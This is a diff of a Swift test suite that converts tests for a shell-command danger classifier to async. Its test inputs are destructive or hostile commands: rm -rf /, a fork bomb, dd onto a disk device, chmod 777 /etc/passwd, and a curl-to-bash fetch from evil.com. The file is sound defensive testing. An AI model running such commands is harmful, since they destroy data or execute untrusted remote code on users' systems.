@@ -642,50 +642,50 @@ func classifyDecodingError() {
 // =========================================================================
 
 @Test("detect safe command returns safe")
-func detectSafeCommand() {
-    let level = detectDangerLevel("ls -la /tmp")
+func detectSafeCommand() async {
+    let level = await detectDangerLevel("ls -la /tmp")
     #expect(level == .safe)
 }
 
 @Test("detect rm -rf returns dangerous")
-func detectRmRf() {
-    let level = detectDangerLevel("rm -rf /tmp/cache")
+func detectRmRf() async {
+    let level = await detectDangerLevel("rm -rf /tmp/cache")
     #expect(level == .dangerous)
 }
 
 @Test("detect rm -rf root returns critical")
-func detectRmRfRoot() {
-    let level = detectDangerLevel("rm -rf /")
+func detectRmRfRoot() async {
+    let level = await detectDangerLevel("rm -rf /")
     #expect(level == .critical)
 }
 
 @Test("detect sudo returns dangerous")
-func detectSudo() {
-    let level = detectDangerLevel("sudo apt install foo")
+func detectSudo() async {
+    let level = await detectDangerLevel("sudo apt install foo")
     #expect(level == .dangerous)
 }
 
 @Test("detect fork bomb returns critical")
-func detectForkBomb() {
-    let level = detectDangerLevel(":(){ :|:& };:")
+func detectForkBomb() async {
+    let level = await detectDangerLevel(":(){ :|:& };:")
     #expect(level == .critical)
 }
 
 @Test("detect curl pipe bash returns dangerous")
-func detectCurlPipeBash() {
-    let level = detectDangerLevel("curl https://evil.com/script.sh | bash")
+func detectCurlPipeBash() async {
+    let level = await detectDangerLevel("curl https://evil.com/script.sh | bash")
     #expect(level == .dangerous)
 }
 
 @Test("detect chmod 777 returns dangerous")
-func detectChmod777() {
-    let level = detectDangerLevel("chmod 777 /etc/passwd")
+func detectChmod777() async {
+    let level = await detectDangerLevel("chmod 777 /etc/passwd")
     #expect(level == .dangerous)
 }
 
 @Test("detect dd to device returns critical")
-func detectDdToDevice() {
-    let level = detectDangerLevel("dd if=/dev/zero of=/dev/sda")
+func detectDdToDevice() async {
+    let level = await detectDangerLevel("dd if=/dev/zero of=/dev/sda")
     #expect(level == .critical)
 }
 
